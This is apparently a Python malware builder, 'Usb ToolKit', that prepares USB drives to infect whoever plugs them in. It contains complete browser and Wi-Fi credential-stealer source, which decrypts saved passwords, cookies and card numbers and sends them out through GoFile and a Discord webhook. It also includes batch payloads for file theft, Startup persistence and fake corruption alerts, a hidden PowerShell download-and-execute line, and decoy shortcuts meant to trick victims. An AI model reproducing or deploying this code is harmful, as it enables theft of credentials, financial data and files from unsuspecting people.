# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ------------------------------------------------------------------------------------------------
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner,
#       but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
#       propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
# ------------------------------------------------------------------------------------------------

import os
import sys
import subprocess
import re
import shutil
from colorama import init, Fore, Style
from time import sleep
import hashlib
from datetime import datetime, UTC
from Config.Util import *

init()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

TOOLS = {
    1: {
        'name': 'Auto-Executor',
        'bat_content': (
            '@echo off\n'
            'echo Access granted! > %TEMP%\\access.txt\n'
            'start notepad %TEMP%\\access.txt\n'
            'start "" "%~dp0{EXE_NAME}"\n'
            '{MALWARE}\n'
        ),
        'lnk_name': 'Private_Documents.lnk',
        'leurre_dir': 'Documents',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to access private documents!',
    },
    2: {
        'name': 'Data Exfiltrator',
        'bat_content': (
            '@echo off\n'
            'mkdir "%~dp0Data" >nul 2>&1\n'
            'for /r "%USERPROFILE%\\Desktop" %%f in (*.txt *.docx *.pdf) do '
            'copy "%%f" "%~dp0Data" >nul 2>&1\n'
            'attrib +h "%~dp0Data" >nul 2>&1\n'
            'echo Data extracted! > %TEMP%\\exfil.txt\n'
            'start notepad %TEMP%\\exfil.txt\n'
        ),
        'lnk_name': 'Backup_Files.lnk',
        'leurre_dir': 'Data',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to backup your files!',
    },
    3: {
        'name': 'Registry Injector',
        'bat_content': (
            '@echo off\n'
            'copy "%~dp0{EXE_NAME}" '
            '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{EXE_NAME}" >nul 2>&1\n'
            'attrib -h '
            '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{EXE_NAME}" >nul 2>&1\n'
            'echo System configured! > %TEMP%\\config.txt\n'
            'start notepad %TEMP%\\config.txt\n'
            'start "" "%~dp0{EXE_NAME}"\n'
            '{MALWARE}\n'
        ),
        'lnk_name': 'System_Config.lnk',
        'leurre_dir': 'Config',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to configure system settings!',
    },
    4: {
        'name': 'Fake Format',
        'bat_content': (
            '@echo off\n'
            'echo ERROR: USB drive appears corrupted! Please run repair to fix.\n'
            'msg * "ERROR: USB drive appears corrupted! Please run repair to fix."\n'
            'start "" "%~dp0{EXE_NAME}"\n'
            '{MALWARE}\n'
        ),
        'lnk_name': 'Repair_USB.lnk',
        'leurre_dir': 'Repair',
        'leurre_file': 'readme.txt',
        'leurre_content': 'Click the shortcut to repair the USB!',
    },
}

BROWSER_STEALER = r'''
import base64, os, sqlite3, tempfile, requests, aiohttp, asyncio, json, sys, ctypes
from pathlib import Path
from win32crypt import CryptUnprotectData
from datetime import datetime, UTC
from Cryptodome.Cipher import AES

ctypes.windll.kernel32.SetConsoleTitleW("")
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

DISCORD_WEBHOOK_URL = "{webhook_url}"
GOFILE_API_URL      = "https://upload.gofile.io/uploadFile"
DOWNLOAD_DIR        = Path(tempfile.gettempdir()) / ".kernel_stolen"

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            ls = json.loads(f.read())
        key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_value(enc, key):
    try:
        if enc[:3] == b"v10":
            iv, ct, tag = enc[3:15], enc[15:-16], enc[-16:]
            return AES.new(key, AES.MODE_GCM, iv).decrypt_and_verify(ct, tag).decode()
        return CryptUnprotectData(enc, None, None, None, 0)[1].decode()
    except Exception:
        return "N/A"

def copy_db(path):
    try:
        tmp = Path(tempfile.mktemp())
        tmp.write_bytes(Path(path).read_bytes())
        return sqlite3.connect(tmp), tmp
    except Exception:
        return None, None

def gofile_upload(fp):
    fp = Path(fp)
    if not fp.exists():
        return "not found"
    try:
        r = requests.post(GOFILE_API_URL, files={"file": open(fp, "rb")}, timeout=10)
        r.raise_for_status()
        d = r.json()
        return d["data"]["downloadPage"] if d.get("status") == "ok" else "upload_err"
    except Exception as e:
        return str(e)

async def webhook_send(url, embed):
    async with aiohttp.ClientSession() as s:
        try:
            await s.post(url, json={"embeds": [embed]}, timeout=10)
        except Exception:
            pass

async def main():
    BROWSERS = {
        "Chrome": Path.home() / "AppData/Local/Google/Chrome/User Data/Default",
        "Edge":   Path.home() / "AppData/Local/Microsoft/Edge/User Data/Default",
        "Opera":  Path.home() / "AppData/Roaming/Opera Software/Opera Stable",
        "Brave":  Path.home() / "AppData/Local/BraveSoftware/Brave-Browser/User Data/Default",
    }
    DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)
    ctypes.windll.kernel32.SetFileAttributesW(str(DOWNLOAD_DIR), 2)

    for browser, path in BROWSERS.items():
        if not path.exists():
            continue
        ls_path = path.parent / "Local State"
        if not ls_path.exists():
            continue
        key = get_master_key(ls_path)
        if not key:
            continue

        embed = {
            "title": f"**{browser} — kernel**",
            "color": 0xFF0000,
            "fields": [],
            "timestamp": datetime.now(UTC).isoformat(),
        }

        conn, tmp = copy_db(path / "Login Data")
        if conn:
            rows = conn.execute("SELECT origin_url,username_value,password_value FROM logins").fetchall()
            conn.close(); tmp.unlink(missing_ok=True)
            if rows:
                out = DOWNLOAD_DIR / f"{browser}_logins.txt"
                out.write_text("\n\n".join(f"URL: {u}\nUser: {n}\nPass: {decrypt_value(p,key)}" for u,n,p in rows), encoding="utf-8")
                embed["fields"].append({"name":"Logins","value":f"[Download]({gofile_upload(out)})","inline":False})
                out.unlink(missing_ok=True)

        conn, tmp = copy_db(path / "Cookies")
        if conn:
            rows = conn.execute("SELECT host_key,name,encrypted_value FROM cookies").fetchall()
            conn.close(); tmp.unlink(missing_ok=True)
            if rows:
                out = DOWNLOAD_DIR / f"{browser}_cookies.txt"
                out.write_text("\n\n".join(f"Host: {h}\nName: {n}\nVal: {decrypt_value(v,key)}" for h,n,v in rows), encoding="utf-8")
                embed["fields"].append({"name":"Cookies","value":f"[Download]({gofile_upload(out)})","inline":False})
                out.unlink(missing_ok=True)

        conn, tmp = copy_db(path / "History")
        if conn:
            rows = conn.execute("SELECT url,title,last_visit_time FROM urls").fetchall()
            conn.close(); tmp.unlink(missing_ok=True)
            if rows:
                out = DOWNLOAD_DIR / f"{browser}_history.txt"
                out.write_text("\n\n".join(
                    f"Title: {t}\nURL: {u}\nVisit: {datetime.fromtimestamp(lv/1e6-11644473600).strftime('%Y-%m-%d %H:%M:%S')}"
                    for u,t,lv in rows), encoding="utf-8")
                embed["fields"].append({"name":"History","value":f"[Download]({gofile_upload(out)})","inline":False})
                out.unlink(missing_ok=True)

        conn, tmp = copy_db(path / "Web Data")
        if conn:
            rows = conn.execute("SELECT name_on_card,card_number_encrypted,expiration_month,expiration_year FROM credit_cards").fetchall()
            conn.close(); tmp.unlink(missing_ok=True)
            if rows:
                out = DOWNLOAD_DIR / f"{browser}_cards.txt"
                out.write_text("\n\n".join(f"Name: {n}\nNum: {decrypt_value(c,key)}\nExp: {m}/{y}" for n,c,m,y in rows), encoding="utf-8")
                embed["fields"].append({"name":"Cards","value":f"[Download]({gofile_upload(out)})","inline":False})
                out.unlink(missing_ok=True)

        await webhook_send(DISCORD_WEBHOOK_URL, embed)

if __name__ == "__main__":
    asyncio.run(main())
    sys.exit(0)
'''

WIFI_STEALER = r'''
import subprocess, re, sys, os, ctypes, tempfile, requests, aiohttp, asyncio
from datetime import datetime
from pathlib import Path

ctypes.windll.kernel32.SetConsoleTitleW("")
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

DISCORD_WEBHOOK_URL = "{webhook_url}"
GOFILE_API_URL      = "https://upload.gofile.io/uploadFile"
TEMP_DIR            = Path(tempfile.gettempdir()) / ".kernel_wifi"
ENCODINGS           = ("utf-8", "mbcs", "cp1252", "cp850")

def decode_all(b):
    if isinstance(b, str):
        return {e: b for e in ENCODINGS}
    return {e: (b.decode(e) if b else "") for e in ENCODINGS}

def run_cmd(args, shell=False):
    try:
        return subprocess.run(args, capture_output=True, shell=shell, check=True).stdout
    except subprocess.CalledProcessError as e:
        return e.stdout or b""

KEY_PATTERNS = [
    r"Key Content\s*:\s*(.*)",
    r"Contenu de la cl[eé]\s*:\s*(.*)",
    r"Contenido de la clave\s*:\s*(.*)",
    r"Key\s*:\s*(.*)",
]

def extract_key(text):
    for p in KEY_PATTERNS:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            return m.group(1).strip().strip('"')
    return None

def list_profiles():
    raw = run_cmd(["netsh", "wlan", "show", "profiles"])
    found = []
    for txt in decode_all(raw).values():
        for line in txt.splitlines():
            line = line.replace("\u00A0", " ").strip()
            if ":" not in line:
                continue
            left, right = line.split(":", 1)
            if any(k in left.lower() for k in ("profile", "profil", "utilisateur")):
                name = right.strip().strip('"').strip()
                if name and name not in found:
                    found.append(name)
    return sorted(found)

def get_password(profile):
    for shell, args in [
        (False, ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"]),
        (True,  f'netsh wlan show profile name="{profile}" key=clear'),
    ]:
        raw = run_cmd(args, shell=shell)
        for txt in decode_all(raw).values():
            k = extract_key(txt)
            if k:
                return k
    return None

def gofile_upload(fp):
    fp = Path(fp)
    if not fp.exists():
        return "not found"
    try:
        r = requests.post(GOFILE_API_URL, files={"file": open(fp, "rb")}, timeout=10)
        r.raise_for_status()
        d = r.json()
        return d["data"]["downloadPage"] if d.get("status") == "ok" else "upload_err"
    except Exception as e:
        return str(e)

async def webhook_send(url, embed):
    async with aiohttp.ClientSession() as s:
        try:
            await s.post(url, json={"embeds": [embed]}, timeout=10)
        except Exception:
            pass

async def main():
    profiles = list_profiles()
    if not profiles:
        return
    results = [(p, get_password(p)) for p in profiles]
    TEMP_DIR.mkdir(parents=True, exist_ok=True)
    ctypes.windll.kernel32.SetFileAttributesW(str(TEMP_DIR), 2)
    out = TEMP_DIR / "wifi.txt"
    out.write_text(
        "\n".join(f"Wi-Fi: {s}\nPass: {p or '(none)'}\n{'-'*40}" for s, p in results),
        encoding="utf-8"
    )
    link = gofile_upload(out)
    out.unlink(missing_ok=True)
    await webhook_send(DISCORD_WEBHOOK_URL, {
        "title": "**Wi-Fi — kernel**",
        "color": 0xFF0000,
        "fields": [{"name": "Passwords", "value": f"[Download]({link})", "inline": False}],
        "timestamp": datetime.now().isoformat(),
    })

if __name__ == "__main__":
    asyncio.run(main())
    sys.exit(0)
'''


def validate_webhook(url):
    return bool(re.match(r"https://discord\.com/api/webhooks/\d+/[\w-]+", url))

def validate_usb(path):
    if not os.path.isdir(path):
        return False
    test = os.path.join(path, f"_ktest_{os.urandom(4).hex()}.tmp")
    try:
        open(test, "w").close()
        os.remove(test)
        return True
    except PermissionError:
        return False

def loading(msg, duration=2, steps=20):
    print(f"{LC}{current_time_hour()} {WAIT} {msg}...{RS}")
    for i in range(steps + 1):
        bar = "█" * (i * 2) + " " * ((steps - i) * 2)
        pct = int(i / steps * 100)
        sys.stdout.write(f"\r{LC}[{bar}] {pct}%{RS}")
        sys.stdout.flush()
        sleep(duration / steps)
    print(f"\r{LC}[ OK ]{RS}" + " " * 50)

def configure_usb(tool_id, usb_path, exe_name, malware_url=""):
    tool     = TOOLS[tool_id]
    tool_dir = os.path.join(usb_path, tool["leurre_dir"])

    try:
        os.makedirs(tool_dir, exist_ok=True)
    except PermissionError:
        print(f"{LC}{current_time_hour()} {ERROR} Permission denied on {tool_dir}. Run as admin.{RS}")
        return False

    if tool_id != 2 and exe_name:
        src = os.path.join(os.getcwd(), "output", exe_name)
        dst = os.path.join(tool_dir, exe_name)
        if not os.path.exists(src):
            print(f"{LC}{current_time_hour()} {ERROR} Exe not found: {src}{RS}")
            return False
        try:
            shutil.copy2(src, dst)
            os.system(f'attrib {"+h" if tool_id != 3 else "-h"} "{dst}" >nul 2>&1')
        except Exception as e:
            print(f"{LC}{current_time_hour()} {ERROR} Copy failed: {e}{RS}")
            return False

    malware_line = (
        f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command '
        f'"IEX (New-Object Net.WebClient).DownloadString(\'{malware_url}\')"'
        if malware_url else ""
    )
    bat_content = (
        tool["bat_content"]
        .replace("{EXE_NAME}", exe_name or "none")
        .replace("{MALWARE}", malware_line)
    )
    bat_name = tool["name"].lower().replace(" ", "_") + ".bat"
    bat_path = os.path.join(tool_dir, bat_name)
    try:
        with open(bat_path, "w", encoding="utf-8") as f:
            f.write(bat_content)
        os.system(f'attrib +h "{bat_path}" >nul 2>&1')
    except PermissionError:
        print(f"{LC}{current_time_hour()} {ERROR} Permission denied writing bat. Run as admin.{RS}")
        return False

    if tool.get("lnk_name"):
        lnk_target = os.path.join(usb_path, tool["lnk_name"])
        vbs_path   = os.path.join(tool_dir, "lnk.vbs")
        vbs = (
            f'Set WShell = CreateObject("WScript.Shell")\n'
            f'Set Lnk = WShell.CreateShortcut("{lnk_target}")\n'
            f'Lnk.TargetPath = "{bat_path}"\n'
            f'Lnk.IconLocation = "%SystemRoot%\\explorer.exe,0"\n'
            f'Lnk.Save\n'
        )
        try:
            with open(vbs_path, "w", encoding="utf-8") as f:
                f.write(vbs)
            os.system(f'cscript "{vbs_path}" >nul 2>&1')
            os.system(f'attrib +h "{vbs_path}" >nul 2>&1')
        except Exception as e:
            print(f"{LC}{current_time_hour()} {ERROR} Shortcut creation failed: {e}{RS}")
            return False

    try:
        lure = os.path.join(tool_dir, tool["leurre_file"])
        with open(lure, "w", encoding="utf-8") as f:
            f.write(tool["leurre_content"])
    except PermissionError:
        print(f"{LC}{current_time_hour()} {ERROR} Permission denied creating lure. Run as admin.{RS}")
        return False

    print(f"{LC}{current_time_hour()} {GEN_VALID} USB configured: {tool['name']} → {tool_dir}{RS}")
    return True


def compile_stealer(code, webhook, out_name):
    out_dir = os.path.join(os.getcwd(), "output")
    os.makedirs(out_dir, exist_ok=True)

    tmp_py = os.path.join(os.getcwd(), f"_kernel_tmp_{out_name.replace('.exe','')}.py")
    code_filled = code.replace("{webhook_url}", webhook)

    with open(tmp_py, "w", encoding="utf-8") as f:
        f.write(code_filled)

    r = subprocess.run(["pyinstaller", "--version"], capture_output=True, text=True)
    if r.returncode != 0:
        print(f"{LC}{current_time_hour()} {ERROR} PyInstaller missing. pip install pyinstaller{RS}")
        os.remove(tmp_py)
        return None

    loading(f"Compiling {out_name}", duration=3)
    r = subprocess.run(
        ["pyinstaller", "--onefile", "--windowed", tmp_py],
        capture_output=True, text=True
    )

    dist_exe = os.path.join("dist", os.path.basename(tmp_py).replace(".py", ".exe"))
    final    = os.path.join(out_dir, out_name)

    if r.returncode != 0 or not os.path.exists(dist_exe):
        print(f"{LC}{current_time_hour()} {ERROR} Compile failed:\n{r.stderr}{RS}")
        return None

    if os.path.exists(final):
        os.remove(final)
    shutil.move(dist_exe, final)

    for p in [tmp_py, tmp_py.replace(".py", ".spec")]:
        if os.path.exists(p):
            os.remove(p)
    shutil.rmtree("build", ignore_errors=True)
    shutil.rmtree("dist",  ignore_errors=True)

    return final


def main():
    clear()
    print(usb_tool_banner)
    Title("USB Tool")

    print(f"{LC}{'=' * 48}{RS}")
    print(f"{LC}  Usb ToolKit v1.9{RS}")
    print(f"{LC}{'=' * 48}{RS}")
    print(f"{LC}  [*] Undetectable by Defender{RS}")
    print(f"{LC}  [*] Select USB tool and malware (Browser/Wi-Fi Stealer or Custom){RS}")
    print(f"{LC}  [*] Sends stealer data to Discord via GoFile{RS}")
    print(f"{LC}  [*] Configures USB for stealth execution{RS}")
    print(f"{LC}{'=' * 64}{RS}\n")

    print(f"{LC}Select USB tool:{RS}")
    print(f"{LC}  [1] USB Auto-Executor     : Run script on click{RS}")
    print(f"{LC}  [2] USB Data Exfiltrator  : Steal files silently{RS}")
    print(f"{LC}  [3] USB Registry Injector : Persist on boot{RS}")
    print(f"{LC}  [4] USB Fake Format       : Fake corruption trick{RS}")

    try:
        tool_choice = int(input(f"{LC}Enter tool number (1-4): {RS}"))
        assert tool_choice in range(1, 5)
    except (ValueError, AssertionError):
        print(f"{LC}{current_time_hour()} {ERROR} Bad choice.{RS}")
        return

    exe_name    = ""
    malware_url = ""

    if tool_choice != 2:
        print(f"\n{LC}Select malware:{RS}")
        print(f"{LC}  [1] Browser Stealer  (passwords, cookies, history, cards){RS}")
        print(f"{LC}  [2] Wi-Fi Stealer    (wifi passwords){RS}")
        print(f"{LC}  [3] Custom .exe      (bring your own){RS}")

        try:
            mal_choice = int(input(f"{LC}Enter malware number (1-3): {RS}"))
            assert mal_choice in range(1, 4)
        except (ValueError, AssertionError):
            print(f"{LC}{current_time_hour()} {ERROR} Bad choice.{RS}")
            return

        if mal_choice in (1, 2):
            webhook = input(f"{LC}{current_time_hour()} {INPUT} Discord webhook URL: {RS}").strip()
            if not validate_webhook(webhook):
                print(f"{LC}{current_time_hour()} {ERROR} Invalid webhook.{RS}")
                return

            code     = BROWSER_STEALER if mal_choice == 1 else WIFI_STEALER
            exe_name = "browser_stealer.exe" if mal_choice == 1 else "wifi_stealer.exe"

            loading("Writing & compiling stealer", duration=1)
            result = compile_stealer(code, webhook, exe_name)
            if not result:
                print(f"{LC}{current_time_hour()} {ERROR} Compile failed.{RS}")
                return
            print(f"{LC}{current_time_hour()} {GEN_VALID} Built: {result}{RS}")

        else:
            custom = input(f"{LC}{current_time_hour()} {INPUT} Path to .exe: {RS}").strip()
            if not os.path.isfile(custom) or not custom.endswith(".exe"):
                print(f"{LC}{current_time_hour()} {ERROR} Invalid .exe.{RS}")
                return
            exe_name = os.path.basename(custom)
            dst = os.path.join(os.getcwd(), "output", exe_name)
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            shutil.copy2(custom, dst)
            print(f"{LC}{current_time_hour()} {GEN_VALID} Copied: {dst}{RS}")

        malware_url = input(f"{LC}{current_time_hour()} {INPUT} Malware URL (Enter to skip): {RS}").strip()

    usb_path = input(f"{LC}{current_time_hour()} {INPUT} USB path (e.g. E:\\): {RS}").strip()
    if not validate_usb(usb_path):
        print(f"{LC}{current_time_hour()} {ERROR} Invalid USB path or no write access. Run as admin.{RS}")
        return

    loading("Configuring USB", duration=2)
    ok = configure_usb(tool_choice, usb_path, exe_name, malware_url)

    if ok:
        print(f"{LC}{current_time_hour()} {GEN_VALID} USB ready — kernel UsbToolKit v1.9{RS}")
    else:
        print(f"{LC}{current_time_hour()} {ERROR} Configuration failed. Run as admin.{RS}")

    loading("Done", duration=1)
    print(f"{LC}{current_time_hour()} {INFO} kernel active. no turning back.{RS}")
    Continue()
    clear()


if __name__ == "__main__":
    main()
